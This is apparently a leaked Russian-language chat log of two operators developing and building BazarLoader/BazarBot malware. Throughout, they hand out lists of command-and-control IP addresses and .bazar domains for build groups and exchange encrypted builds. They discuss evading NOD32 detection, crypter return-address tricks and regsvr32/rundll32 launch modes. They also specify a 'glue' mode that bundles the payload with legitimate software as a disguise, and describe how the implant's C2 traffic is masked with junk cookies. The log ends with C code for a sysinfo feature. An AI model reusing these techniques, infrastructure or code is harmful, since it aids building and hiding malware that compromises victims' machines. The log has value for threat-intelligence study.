blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[11.08.21 07:38:43] collin:		направь Вилду
[11.08.21 08:50:46] collin:		уточнение, в группе 20:
[11.08.21 08:51:06] collin:		оставь режим как вчера было regsvr32+rundll32(StartW) - если ты это еще не убрал
[11.08.21 09:06:56] royal:		Так всегда.
[11.08.21 09:07:10] royal:		Для 19 20 если не указано другое.
[11.08.21 09:07:20] collin:		ок
[11.08.21 09:50:04] royal:		Для информации _ReturnAddress и  __builtin_return_address(0) работают везде и с оптимизациями. Проверял 32 и 64 бит GCC/Clang/MSVC
[11.08.21 09:50:44] collin:		это хорошо!
[11.08.21 09:52:11] royal:		Получаю имя так. В DllMain через GetModuleFileNameW(hInstDll), не прокатило, получаю в экспотрной функции через _ReturnAddress/__builtin_return_address(0).
[11.08.21 09:52:39] royal:		По идеии 100 процентная вероятность получить имя должна быть.
[11.08.21 09:52:59] collin:		надо с криптом потестить с адресом возврата
[11.08.21 09:53:14] royal:		Да.
[11.08.21 09:53:16] collin:		в сегодняшней сборке есть уже это?
[11.08.21 09:53:27] royal:		Нет.
[11.08.21 09:53:47] royal:		Даже если бы было, крипт передаёт правильный hInsDll
[11.08.21 09:53:52] collin:		ну когда будет готово - напишешь
[11.08.21 09:54:02] royal:		До returnadress не доходило бы.
[11.08.21 09:54:04] collin:		мы сделаем другим профилем - rundll32 как раньше, он не передает
[11.08.21 09:54:26] collin:		добавь в логированную версию чтобы выводил - какой метод какое имя показывает
[11.08.21 09:54:48] collin:		`он не передает` - точнее, тут не регламентировано, кто-то может и передает
[11.08.21 09:57:10] collin:		как выйти на адрес функции в крипте, затем на ее имя - есть идеи?
[11.08.21 09:57:53] collin:		думаю в профиль криптов bk добавить - чтобы в параметр функции нагрузки это передавалось, самый простой вариант
[11.08.21 09:58:13] collin:		из кода нагрузки в произвольном блоке памяти - пока ничего не придумал
[11.08.21 09:58:43] royal:		DllMainCRTStartup(HINSTANCE hInst, DWORD dwReason, LPVOID lpvReserved)
[11.08.21 09:58:49] royal:		LPVOID lpvReserved вот сюда.
[11.08.21 10:03:06] royal:		Или в экспортную функцию, сделать ей один параметр PVOID.
[11.08.21 10:03:26] royal:		В будущем можно туда передавать что угодно можно будет тогда по необходимости.
[11.08.21 10:03:29] collin:		в экспорт-функциию будет, в дллмаин не сможет передать
[11.08.21 10:09:11] collin:		сделай сборку - группа g15
[11.08.21 10:09:27] collin:		x64, generic, для новой основной
[11.08.21 10:09:45] collin:		адреса и базары:
[11.08.21 10:09:50] collin:		```
адреса (домены) первого этапа
бот:
68.183.14.255
142.93.128.204
178.128.245.196
167.71.11.125

лоадер:
178.128.245.196
167.71.11.125
68.183.14.255
142.93.128.204

домены второго этапа
бот:
turbo4498.bazar
super1274.bazar
cyber9426.bazar

лоадер:
retro9032.bazar
quasi4138.bazar
undo2894.bazar
```
[11.08.21 10:09:53] collin:		скинь wild
[12.08.21 07:21:41] collin:		привет!
[12.08.21 07:21:50] collin:		сделай сборки - группы 19 и 20
[12.08.21 07:21:59] collin:		с теми же параметрами как вчера
[12.08.21 07:21:59] collin:		адреса:
[12.08.21 07:22:07] collin:		```
адреса (домены) первого этапа
бот:
188.166.99.175
64.225.65.20
64.227.68.7
188.166.32.223

лоадер:
64.225.65.20
64.227.68.7
188.166.32.223
188.166.99.175

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[12.08.21 07:22:20] collin:		на тест wild и 19 мне продублируй
[12.08.21 07:33:30] collin:		отпишись как начнешь готовить
[12.08.21 07:46:38] royal:		Начал готовить.
[12.08.21 08:16:14] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAApxFJO0tSKuhBnaYoirmSUqaRbWTg1YOeNRpZlQINtKtB
g8hFUcp7S5DNUu4RJ7rfuPfOJQfXHt2GA2SOvWegG3p00+uG7vbHIsJutMy5rL6L
y4HRIFWTtd2/T1wncTMUjsQIg/dolHTb1jvGV+VjUHQYcaJxXniG7ia9IgBRv7Su
FwQH9EdpGXvNQQX6uTQLuhaqXdSkAchFsUXouLpVLlZWfzd5wHrXLeE4dRLbJlfo
En5gO/pUp18xKJNJF0u7BaF+Y4q415iAO0xNz3F311YSDcd/jhc4jHKO9p4VLmbx
QUoU89olxRjH0cwRam/75my9UlH1fIUPiGWkXeS/gVsZdfr3sw+bXbzFse44n6B/
aDgM9LfGLQEmD0p5YRGaPYj4aiiy2TYEW2s2I3WwWt0PN13K9tA08giCpLwlGMYa
P7KpwmkMn+PaiY07yMIIwX/gE/ktfUrGvSmjz6t9ScMIiVWutmQQONVu3+PElHJO
8v679AMcQpjIdsdwb+DEnY55nbq0ShaF/DrbuuZTHdM/cO8y6xF32iPtphyNGn+D
Pdczsj547SNIRPBC3QP4M37SWMK21Ir89//DkckIfauX8sTMfgdofraUVUYJjqem
7TVrNJDsiprsiqFTA19EQVeqMVJHap3MvfZQuUpv+uhs1ZMoNeE70FqqN3jI8BLS
wDsBLdrUoJUADzhZzKk6s6Sc3ax7xsRQ3QqFJ4mi5mrofEhx/1TM2w9dT8LztXAy
Jej/tbkWq22sbrl4Y3Z2RfwaMpTHkPt/LdbDRkGEWli2bPVQZjxL/6yv37K8umET
sT/Ub8pAd8ReA2QdTRibSsaSdqCdktRBb+BVWu4GXO6OPUfKN94K95mZjtHywLFM
u0FiBhab7eDPQggGgKQi1JXwHsR9BoYAOobKxlOibx/gD085UQqBol4x5uTCGFIS
Eq8QuBjNhnQwwCsav+LrrngZJ8pZA75X/FAngiMy8ghvzH7psbQ5475zkur/Zv2z
8+Kv2nzGzyCZkfywqA==
=2Rs/
-----END PGP MESSAGE-----
[12.08.21 08:16:20] royal:		Использовать MSVC.
[12.08.21 08:17:32] royal:		Тест связи.
[12.08.21 08:18:48] royal:		Там кстати получение имени есть через адрес возврата в эеспортных функциях, если не получилось в DllMain. Можно попробовать крипт другой.
[12.08.21 08:19:57] collin:		понял, попробую
[12.08.21 08:50:17] collin:		```
Режим лоадера generic-glue
"Клей" - это решение по соединению полезной нагрузки с маскирующим софтом - легитимное приложение или установщик ПО в единый исполняемый файл (exe). При запуске исполняемого файла одновременно запускается полезная нагрузка и маскирующий софт, при этом оба выполняются в одном процессе (нагрузка запускается в отдельном потоке).
Режим является модификацией режима generic, с учетом следующих изменений и дополнений:
1. полезная нагрузка в формате exe не используется для криптования (склеивания).
2. предусмотрено два способа запуска исполнительного файла, полученного в результате склеивания: с запуском маскирующего софта и полезной нагрузки, и только запуск полезной нагрузки.
По умолчанию полезная нагрузка запускается вместе с маскирующим софтом.
Способ запуска задается первым параметром командной строки после символа слеш: "/%prm_no_soft%", где prm_no_soft - константное текстовое значение, которое:
- задается на стадии сборки лоадера БК;
- задается в качестве параметра при формировании итогового исполнительного файла системой сборки "Клей";
- используется в алгоритмах итогового исполнительного файла для определения способа запуска.
В качестве полезной нагрузки выступает модуль лоадера БК в формате dll.
Лоадер должен определять способ своего запуска и завершаться (после выполнения своего функционала) в зависимости от этого:
- для способа "с маскирующим софтом" - завершение через return из DllMain().
- для способа "без маскирующего софта" - завершение через ExitProcess().
3. При запуске способом "с маскирующим софтом" лоадер должен перезапустить себя способом "без маскирующего софта" с минимальной задержкой от момента запуска (от 1 до 5 секунд), после чего продолжить дальнейшую работу.
В команды для закрепления и последующего перезапуска модуля лоадера (если используется) обязательно добавлять параметр prm_no_soft.
```
[12.08.21 08:50:30] collin:		подтверди получение
[12.08.21 08:50:36] collin:		новое ТЗ, приоритет средний
[12.08.21 08:54:13] royal:		Получил.
[12.08.21 10:03:33] royal:		Напиши ещё раз про клей ТЗ. У меня диск на котором виртуальная машина с Windows отвалился, я не успел сохранить.
[12.08.21 10:03:56] collin:		сек
[12.08.21 10:04:04] collin:		вилд пишет группу 20 не получил от тебя
[12.08.21 10:04:21] royal:		Не получил. Там NOD 32.
[12.08.21 10:04:47] collin:		```
Режим лоадера generic-glue
"Клей" - это решение по соединению полезной нагрузки с маскирующим софтом - легитимное приложение или установщик ПО в единый исполняемый файл (exe). При запуске исполняемого файла одновременно запускается полезная нагрузка и маскирующий софт, при этом оба выполняются в одном процессе (нагрузка запускается в отдельном потоке).
Режим является модификацией режима generic, с учетом следующих изменений и дополнений:
1. полезная нагрузка в формате exe не используется для криптования (склеивания).
2. предусмотрено два способа запуска исполнительного файла, полученного в результате склеивания: с запуском маскирующего софта и полезной нагрузки, и только запуск полезной нагрузки.
По умолчанию полезная нагрузка запускается вместе с маскирующим софтом.
Способ запуска задается первым параметром командной строки после символа слеш: "/%prm_no_soft%", где prm_no_soft - константное текстовое значение, которое:
- задается на стадии сборки лоадера БК;
- задается в качестве параметра при формировании итогового исполнительного файла системой сборки "Клей";
- используется в алгоритмах итогового исполнительного файла для определения способа запуска.
В качестве полезной нагрузки выступает модуль лоадера БК в формате dll.
Лоадер должен определять способ своего запуска и завершаться (после выполнения своего функционала) в зависимости от этого:
- для способа "с маскирующим софтом" - завершение через return из DllMain().
- для способа "без маскирующего софта" - завершение через ExitProcess().
3. При запуске способом "с маскирующим софтом" лоадер должен перезапустить себя способом "без маскирующего софта" с минимальной задержкой от момента запуска (от 1 до 5 секунд), после чего продолжить дальнейшую работу.
В команды для закрепления и последующего перезапуска модуля лоадера (если используется) обязательно добавлять параметр prm_no_soft.
```
[12.08.21 10:05:33] collin:		так одинаковый же формат 19 и 20, 19 при этом без детекта?
[12.08.21 10:06:25] royal:		Когда я проверял 19 не было детекта. Может появился.
[12.08.21 10:06:35] royal:		А может повезло.
[12.08.21 10:42:57] royal:		Если не очищу посылать группу 20? Там один детект NOD 32 BazarLoader как всегда.
[12.08.21 10:46:07] collin:		попробуй еще почистить, если не получится до 15 мск - направляй как есть
[12.08.21 11:56:41] collin:		я со следующей недели в отпуске, вместо меня elroy - он будет ставить задачи, тех.вопросы по сборкам тоже к нему
поэтому до конца этой недели:
1) еще раз изучи все задания в багтрекере редмайн из тех что не закрыты (в работе или не приступал);
2) задай вопросы если они будут
в первую очередь по задачам с приоритетом Высокий
[12.08.21 11:56:47] collin:		подтверди что увидел
[12.08.21 11:57:26] royal:		Я изучил всё.
[12.08.21 11:57:45] collin:		вопросы остались?
[12.08.21 11:58:04] royal:		Там есть которые сделаны были уже до того как там появились. Их как закрывать как "Отказаться"?
[12.08.21 11:58:20] collin:		например?
[12.08.21 11:59:46] royal:		Командная строка запуска лоадера через regsvr32 - уточнение
[12.08.21 12:00:34] royal:		Ещё была когда ip цифрами и хостом
[12.08.21 12:00:34] collin:		напиши все которые реализованы уже в полном объеме, как в текущем таске
[12.08.21 12:00:38] collin:		я сейчас сам закрою и помечу
[12.08.21 12:00:49] royal:		Я её закрыл сразу без трудовых затрат.
[12.08.21 12:01:04] collin:		ну закрывай в статус "готово" все равно
[12.08.21 12:01:21] collin:		можешь добавить сообщение в задачу что "было реализовано ранее"
[13.08.21 08:06:16] collin:		привет!
[13.08.21 08:06:27] collin:		сделай сборки группы 19 и 20 - с теми же параметрами что были вчера
[13.08.21 08:06:35] collin:		адреса и базары новые:
[13.08.21 08:06:43] collin:		```
адреса (домены) первого этапа
бот:
161.35.69.224 
161.35.69.209 
161.35.77.21
161.35.69.139

лоадер:
161.35.77.21
161.35.69.139
161.35.69.224 
161.35.69.209 

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[13.08.21 08:06:47] collin:		направь wild
[13.08.21 10:47:20] collin:		сделай сборку группа g5
[13.08.21 10:48:50] collin:		x64, режим rundll32(FindString)
[13.08.21 10:48:53] collin:		адреса и базары:
[13.08.21 10:49:02] collin:		```
адреса (домены) первого этапа
бот:
141.136.0.244
64.225.67.59
45.89.106.80
64.225.71.185

лоадер:
45.89.106.80
64.225.71.185
141.136.0.244
64.225.67.59

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[13.08.21 10:49:06] collin:		направь порфирио
[13.08.21 10:49:55] collin:		`rundll32(FindString)` - или rundll32(StartW) у тебя переименование есть же
[13.08.21 11:01:10] royal:		У меня нету g5
[13.08.21 11:02:19] collin:		добавил
[13.08.21 11:02:23] collin:		на новой основной
[13.08.21 11:03:16] royal:		Есть.
[13.08.21 11:14:38] collin:		у тебя в логе сборки не отображается способ, которым имя удалось определить?
[13.08.21 11:15:44] collin:		в лоадере гр. 19
[13.08.21 11:16:02] royal:		Пока нет.
[13.08.21 11:16:48] collin:		добавь в ближайшем будущем
[13.08.21 11:17:22] collin:		а то в тестовом режиме он может и из командной строки корректно взять
[13.08.21 11:18:19] royal:		Из командной строки не беру больше.
[13.08.21 11:18:45] royal:		Только имя функции беру если первый параметр командной строки rundll32
[13.08.21 11:19:02] collin:		понятно
[13.08.21 11:19:47] collin:		насчет имени функции - будет модификация под профиль крипта bk
[13.08.21 11:20:55] collin:		как только ТЗ точное точное с Элроем сформируем - дам таск
[13.08.21 11:44:54] royal:		Один детект NOD 32 очистить быстро не получиться.
[13.08.21 11:49:47] collin:		направляй как есть
[13.08.21 12:55:09] royal:		Проверяли крипт, который не передаёт корректный hInstDll в DllMain?
[13.08.21 12:55:53] collin:		в процессе
[13.08.21 13:30:17] collin:		проверили, работает, path садится
[13.08.21 13:32:28] royal:		Закрываю задачу.
[30.08.21 07:17:00] collin:		привет!
[30.08.21 07:17:40] collin:		напиши мне какие сборки-группы в пятницу делал
[30.08.21 07:21:52] royal:		19 x64 regsvr
[30.08.21 07:22:06] collin:		и как успехи по доработкам БК, есть ли сложности-вопросы
[30.08.21 07:22:42] royal:		10 4 способ запуска так и не известен.
[30.08.21 07:26:34] royal:		Запускается так же как и старая версия загрузчика.
[30.08.21 07:26:46] collin:		да, сейчас так
[30.08.21 07:27:16] collin:		скинь мне адреса которые были в пятницу для бк
[30.08.21 07:29:51] royal:		Бот:
104.248.164.94
104.248.175.208
172.83.155.231
194.15.113.148

Загрузчик:
104.248.170.50
104.248.170.182
207.154.229.94
94.140.112.9
[30.08.21 07:32:00] collin:		они впервые в пятницу были, или в четверг тоже эти?
[30.08.21 07:33:22] royal:		Могли быть в четверг тоже, и поменялся 1-2 адреса.
[30.08.21 07:33:47] royal:		Я не запоминаю, заменяю новыми адресами старые.
[30.08.21 07:34:14] collin:		ок
[30.08.21 09:12:50] collin:		сделай сборку группа 19
[30.08.21 09:12:57] collin:		x64, regsvr32
[30.08.21 09:13:01] collin:		адреса и базары:
[30.08.21 09:13:06] collin:		```
адреса (домены) первого этапа
бот:
167.172.37.20
167.172.37.33
64.225.71.198
64.227.72.14

лоадер:
64.225.71.198
64.227.72.14
167.172.37.20
167.172.37.33

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.08.21 09:13:17] collin:		на тест отдавай wild
[30.08.21 10:37:40] collin:		сделай еще сборку группа 20
[30.08.21 10:37:47] collin:		с теми же адресами и параметрами как 19
[30.08.21 10:37:49] collin:		направь wild
[30.08.21 11:43:23] collin:		сделай еще группу 30
[30.08.21 11:43:29] collin:		с теми же параметрами как 19 20
[30.08.21 12:07:21] collin:		30 тоже wild направь
[30.08.21 12:35:19] collin:		скажи с allen разбирались по его стабу?
[30.08.21 12:35:32] collin:		```
Еще есть проблема royal + allen
Сборку у allen - проверял, болванка там работает.
royal при этом всеми без проблем криптуется.
Последний раз allen сообщил, что проблема все же стороны royal, показал что запуск производится. Пока тишина
```
[30.08.21 12:44:08] royal:		Нет. У него адрес функции StartW в крипте не верный.
[30.08.21 12:44:31] royal:		Разбирается. Сказал напишет мне, пока не писал по этому поводу.
[30.08.21 12:47:51] collin:		ок
[30.08.21 13:14:19] collin:		```
Опросник - профиль трафика в БК
1. В каком порядке перебираются адреса на 1 шаге стратегии поиска - всегда в одинаковом или в случайном?
2. Есть ли ограничение размера рантайм-списка 1 шага стратегии поиска? Если есть - по какому признаку удаляются из него адреса при достижении лимита?
3. Как осуществляется передача команд в боте (подписи даты в лоадере) - через куки/хедеры/может быть и то и другое в одной сборке?
4. Каким образом формируются имена куки / хедеров для передачи мусорных значений и команд боту (подписи даты в лоадере)?
4.1 формат имени (словарь из хардкод списка, слова+префиксы, генерация произвольных буквенных / цифро-буквенных значений и т.д.)?
4.2 случайность имен - генерируются новые для каждого запроса или - генерируется список имен для сборки/машины/при запуске - по аналогии с "Fake Cookies" в карточке группы, затем из этого списка выбираются имена для очередного запроса?
5. Генерируются ли мусорные куки или хедеры, или и то и другое, или это зависит от способа передачи команды боту / подписи лоадера?
6. Сколько мусорных куки / хедеров формируется в запросах (в каком диапазоне случайное значение)?
7. Какой формат (форматы) значений мусорных куки / хедеров используется?
один формат (например - малые латинские буквы и цифры комбинация длины в случайном диапазоне от.. до..) или разные (например, целое десятичное число, hex-значение, base64 и т.д.)?
```
[30.08.21 13:14:33] collin:		напиши мне инфу по своей сборке БК до завтра
[30.08.21 13:43:06] collin:		в редмайне новый таск короткий "Изменение параметра netdomain в отчете Get SystemInfo" сделай его в первую очередь
[30.08.21 13:44:07] royal:		1. Всегда в одинаковом.
2. Ограничений нет.
3. Передаётся через первый куки, так как прокладки портят заголовки, чем дальше от начала заголовка
информация зашифрованная, тем вероятнее что она будет удалена. Куки всегда идут вначале заголовка.
4. Одни и теже распространённые имена, использующиеся валидными сайтами, в которых передаётся иформация в виде base64.
4.1 Один список имён.
4.2 Используются имена из списка всегда одни и те же.
5. Значения заголовков всегда мусорные, и их размер такой же как и у зашифрованной информации.
6. 7 у бота, 10 у загрузчика.
7. Все заголовки это Base64, кроме заголовков с датами.
[30.08.21 13:45:27] collin:		`7 у бота, 10 у загрузчика.` - всегда одинаковое количество?
[30.08.21 13:45:48] collin:		в каждом запросе
[30.08.21 13:45:54] royal:		Да.
[30.08.21 13:55:48] royal:		%group% размер букв учитиваем?
[30.08.21 13:55:54] royal:		%GROUP%
[30.08.21 13:55:58] royal:		%GrouP%
[30.08.21 13:56:39] collin:		как у тебя сейчас
[30.08.21 13:56:42] collin:		для %id%
[30.08.21 13:56:42] collin:		?
[30.08.21 13:57:29] royal:		Учитывается прокатит только %id%
[30.08.21 13:57:44] royal:		%Id% уже считается другим.
[30.08.21 13:58:44] collin:		оставь с учетом регистра оба, только маленькие буквы
[30.08.21 14:51:23] royal:		Пишу в Script Parameters %id% %group% в Script cd C:\
Получаю 12 1 60 %id% %group%
[30.08.21 14:51:38] royal:		Скрипт обрезается.
[30.08.21 14:52:15] royal:		Это наверное у меня ошибка.
[30.08.21 14:53:04] royal:		Не у меня ошибка, эту строку я получаю в ответе.
[30.08.21 14:53:29] royal:		Короче баг получается в админке.
[30.08.21 14:56:32] royal:		Это не баг, сценарий же в теле приходит.
[30.08.21 15:42:47] collin:		скрипт в теле, команда тип таймаут параметры командной строки - в куки
[30.08.21 15:43:18] royal:		Да.
[31.08.21 07:54:12] collin:		привет!
[31.08.21 07:54:22] collin:		сделай сборки группы 19 и 20
[31.08.21 07:54:33] collin:		x64 regsvr32
[31.08.21 07:54:36] collin:		адреса и базары:
[31.08.21 07:54:50] collin:		```
адреса (домены) первого этапа
бот:
64.225.105.222
167.172.172.113
64.225.110.48
64.225.108.199

лоадер:
64.225.110.48
64.225.108.199
64.225.105.222
167.172.172.113

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[31.08.21 07:54:55] collin:		скинь wild
[31.08.21 07:55:00] collin:		группу 19 мне продублируй
[31.08.21 09:49:46] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAr+hEt43UF7i5piTiXEfYdnHW2O3eJdEj2Ky+4YmJjeBf
PlpNskYLPPEcW/P8bBcAeOxNuc8bFOHcetw5KnWtTRpryFH+JwQVx/fXkQZYBhzs
4TYcaQCzMGQ579hlx42dWJg7LiPyPJTfQe3AVt3MsShZ/PG0DI6GUASdD/Hjq30a
qXF07i+JrrXviTM1pqp7SOxf/AYZ3ZBOGr0LjTAhAEA9aylKbkmopIJDvFCoqHBm
954QYR/EkrqXOvwuHTeoOOzSvwAPaMtuhfmovf37QvuNFb/yYy9H6eFQ8EV3Tpvg
1TrMIyDY6HjBajZQDksxUYFR3Ceur/YLuBADv+K51/WBk3qmRqqOI9dFKb0zr5Gb
0T7xOo9WHJmwpKTfsfHBBtMDEbcdV+0YKpQqjPCGI4PS9mbVG+q0lMqdhGtKL463
t1m1ZMVVT32qcDnovbWc3rb3sJ8Qac///3EkqlDGPHGayYTnzxJX9w9pnhTB5XjF
WOtCZZ4nFIweCOU0HEQLgsoIJeakmKebwcPtODWoEUjC93HHCoiT5p7ex+z582yd
Kd6Ewv656iymAPvhIeJ6Ce084fJfUief6CwPpBON71nD912lC/6ZNWfkraR03XiQ
AsOyZrnQokGEsHmuGo7h7V+PENaUxRPT3mlsDqqwtVmREcgqGDvPJsJaycPk/e3S
wD4B+9E4AHmhvk5f0fTfxa8drIennhGWlzQ++cthx6lMzbZSbDhWkMBHolyfORv2
j/E2/RrCfifjmTcWwtEEQ9gZ4ZTUZofYYIqFTx/b2CMccOxy3D+uZmH02RY9XA3T
8WMSDrFwOrACPpRRAaPt8XmkUwiMBnbb+D64nxT+Cq/q6DU2CE4DNKXtAaJpzAyD
DTQ/fMQKSsnXvhy/TwrovS24ImL99zOq4RD6mTN/ypfhS3b3zafkq+6A0BbEv0Bb
qmdagKP/zMMu++5M5AVOkqyvLxLt+LJRAn2m4YJTDf+VEIZcH0gwl2nGztWsD7+Q
P5daQcVnMoSQrv6egWlDnw==
=zia6
-----END PGP MESSAGE-----
[31.08.21 09:49:51] royal:		Использовать MSVC.
[31.08.21 09:53:15] collin:		+
[01.09.21 08:13:53] collin:		привет!
[01.09.21 08:14:43] collin:		1) проверь резолв базаров в боте сборки release_nologs - вчера тестил, не коннектит
[01.09.21 08:15:03] collin:		именно бот в nologs, при запуске как через лоадер так и напрямую модулем
[01.09.21 08:15:18] collin:		в лоадере все норм, в боте логированном тоже отрабатывает корректно
[01.09.21 08:16:03] collin:		пока нет базаров сентябрьских, как зарегаю напишу
[01.09.21 08:16:29] collin:		2) сделай сборки группы 19 20 30
[01.09.21 08:16:37] collin:		x64, regsvr32
[01.09.21 08:16:41] collin:		адреса и базары:
[01.09.21 08:16:58] collin:		```
адреса (домены) первого этапа
бот:
164.90.198.80
164.90.198.90
64.225.105.147
164.90.198.93

лоадер:
164.90.198.93
164.90.198.90
164.90.198.80
64.225.105.147

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[01.09.21 08:17:09] collin:		направь wild, 19 мне продублируй
[01.09.21 09:05:12] royal:		К какому адресу базар должен подключиться,
[01.09.21 09:05:15] royal:		?
[01.09.21 09:08:04] collin:		зарегаю, через полчаса скажу
[01.09.21 09:33:00] collin:		```
64.225.106.4 emxiuhyw.bazar 190.31.148.250
167.172.186.69 onroekem.bazar 89.82.68.187
64.225.106.4 qegouhed.bazar 190.31.148.250
167.172.186.69 omkywyyw.bazar 89.82.68.187
```
[01.09.21 09:33:23] collin:		первый столбец адрес сервера, последний - обфусцированный xor 254 адрес
[01.09.21 11:05:53] royal:		19, 20Б 30 детект NOD 32 будет, я до сих пор не смог отчистить.
[01.09.21 11:09:11] collin:		выдавай как есть сегодня, так попробуем криптонуть
[01.09.21 11:23:29] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAnUaPPBaCM+BZ9BG1lQSx3gkd9vV6gdrWmgzg7UI5muXb
5dFTDblZuyMZ3u3UmGHcZ3cg/vCL702AieJ4J1F/IYUWXipBz5ArTzePJtdtY1if
XjBlMzDHnQCm0evO23sII9DT2IN6D06R/RECycNBkG13UHbw06SjNqqa2tMRCQE/
w5E3LuQOl56cyNgHBXsJOvYQoErabcMCX5p9MbsYbGlOVQnL72I6LIVzBKkzkPXM
Genz57PRXXHqMjyYx1P4homsYTApzvxtMxPYt8VP3upQNEFYucclO8qivwoK/h4D
O92rLcYQJzH7tSZWrSkmxaFFJnR7HEYWeQvk6HUFK+cpp00Rv4VEVViEKQdjHH47
54UZehiEkjDAQ5yiAMLSG4mRDtiXnPYjPJBBVu7KRgVWFc9WJV6qmlwkdpMTPkou
dmoNiFGBy+pexjvnmBMqhQ1I9266weqALiYxnzRHyLM4eOkToL0vK4rE7N3zvaIQ
gLFijFH+2A86V1dUcpmzPaUxA1NPcrytM2i6cYGyoXJNMGbBXKQ4BR0iAUdGikqv
BxMoWjDbFyuDGFmnE4BNL8xfJOZTiLlXvEP17c2idpo+1W3q5uJh/boQYi4iT9mW
pkb7JfDXhEB9UeuSQfmU5NKxs2ey8IocyFDSTvgo7C2aGqvy4J7IqZ6c5suZtfHS
wCIBjKLvI5NbZ26zRx0xVF9v7x53fhdysTnSTtvnJ6SFb39aWykkM5t5ulXulCBp
ypHx/r+zVZHqIrnLa+7RF92LpUvZEYHHKEIyMmTjkz0ikuJLe0XXTyRq2HxFYC0k
rcj2zrrIWl8NM07MWQ7qa7V39OBxMVnQiXOSuop6/Rdq5cXKvpBbyosJyoKpeSMA
fQF+L7wIVEdf4hlwR0pttKQpNo8OKWuuhafpk1wwdEysml9Z0Nq4/bV050cOBz7e
Boft5+S9xWLkAahhpJqh0OXJHJ1EQWs1TES+6CoyyW3iA4Qj
=oHwR
-----END PGP MESSAGE-----
[01.09.21 11:28:23] collin:		+
[01.09.21 12:19:39] collin:		скажи ты не взаимодействовал с orval
[01.09.21 12:19:52] collin:		по проблеме с его стабом № 9, профиль BK
[01.09.21 12:20:17] collin:		в последние 2-3 недели?
[01.09.21 12:37:12] royal:		Нет.
[01.09.21 12:38:14] collin:		проблема осталась - напиши orval уточни нужна ли какая-то инфа от тебя для исправления
[01.09.21 14:00:18] collin:		насчет поиска СС через базары в боевом боте не смотрел?
[01.09.21 14:01:01] royal:		Нет еще?
[01.09.21 14:01:06] royal:		Нет еще.
[01.09.21 14:01:48] collin:		займись этим в первую очередь, таск добавлю
[01.09.21 14:05:12] collin:		в первую очередь после чистки*
[01.09.21 14:05:18] royal:		За 1 секунду нашел и подключилсяю
[01.09.21 14:05:47] collin:		в сегодняшней сборке?
[01.09.21 14:05:55] royal:		В чем проблема была?
[01.09.21 14:06:04] royal:		Да.
[01.09.21 14:06:16] collin:		вот как написал, в боевом боте не коннектилось
[01.09.21 14:06:26] collin:		процесс висел при этом, UDP пакеты шли
[01.09.21 14:06:37] collin:		это вчера было, сесгодня проверю
[01.09.21 14:06:52] royal:		Может это прокладка тупила.
[01.09.21 14:06:58] collin:		вряд ли
[01.09.21 14:07:05] collin:		посмотри свои боты боевые - хоть один через базар выходил?
[01.09.21 14:07:11] collin:		в новой админке не одного не нашел с июля
[01.09.21 14:36:41] royal:		Исправил. Обновил обфускатор строк свой на новый свой. Не верно старый получается обфусцировал строки типа \x57\xe2\xb9\x29\x25\x0e\x9d\x5c\x83\x77\x5f\x37\x02\x03\xa7\xd0
[01.09.21 14:37:30] collin:		что в этих строках?
[01.09.21 14:38:17] royal:		init_syllables()
[01.09.21 14:38:38] collin:		а в logged-версии был другой обфускатор, или без него вообще?
[01.09.21 14:39:18] royal:		В logged обфускация строк выключена.
[01.09.21 14:39:22] collin:		ок
[01.09.21 14:39:29] collin:		со следующей сборкой гляну тогда
[02.09.21 07:25:09] collin:		привет!
[02.09.21 07:25:24] collin:		Нед сделал таск про получение инфы об integrity level
[02.09.21 07:25:27] collin:		держи как пример, чтобы быстрее этот таск добить:
[02.09.21 07:25:38] collin:		```
Расширена передаваемая в ответ на команду sysinfo информация значением уровня integrity level, на котором исполняется модуль.
В модуль winapi.cpp добавлена функция GetProcessIntegrityLevel(), которая при исполнении заполняет глобальную строку ProcessIntegrityLevel
уровнем целостности.

void GetProcessIntegrityLevel() {
    HANDLE hToken;
    HANDLE hProcess;
    DWORD dwLengthNeeded;
    DWORD dwError = ERROR_SUCCESS;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    LPWSTR pStringSid;
    DWORD dwIntegrityLevel;
    hProcess = kernel32GetCurrentProcess();
    if (advapi32OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {// Get the Integrity level.
        if (!advapi32GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded)) {
            dwError = GetLastError();
            if (dwError == ERROR_INSUFFICIENT_BUFFER) {
                pTIL = (PTOKEN_MANDATORY_LABEL)_heapAlloc(dwLengthNeeded, 0);
                if (pTIL != NULL) {
                    if (advapi32GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
                        dwIntegrityLevel = *advapi32GetSidSubAuthority(pTIL->Label.Sid,
                            (DWORD)(UCHAR)(*advapi32GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
                        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {// Low Integrity
                            ProcessIntegrityLevel = "Low Process";
                        }
                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                            dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {// Medium Integrity
                            ProcessIntegrityLevel = "Medium Process";
                        }
                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
                            dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {// High Integrity
                            ProcessIntegrityLevel = "High Integrity Process";
                        }
